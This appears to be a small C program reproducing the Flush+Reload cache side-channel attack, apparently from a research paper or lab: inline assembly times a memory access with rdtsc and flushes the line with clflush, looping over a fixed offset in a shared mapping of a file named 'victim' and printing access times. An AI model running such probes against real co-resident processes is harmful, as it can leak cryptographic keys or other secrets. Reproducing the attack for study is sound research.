#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>

int threshold = 200;

// code from the original paper

int probe(char *adrs) {
    volatile unsigned long time;

    asm __volatile__ (
        "   mfence \n "
        "   lfence \n "
        "   rdtsc \n "
        "   lfence \n "
        "   movl %%eax, %%esi \n "
        "   movl (%1), %%eax \n "
        "   lfence \n "
        "   rdtsc \n "
        "   subl %%esi, %%eax \n "
        "   clflush 0(%1) \n "
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    
    return time;
}

int main() {
    int fd = open("victim", O_RDONLY);

    if (fd < 0) {
        printf("fail\n");
        return 1;
    }

    char *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, 0);
    int offset = 4553;
    char *adrs = map + offset;

    while(1) {
        printf("time: %d\n", probe(adrs));
        fflush(stdout);   
    }


    
}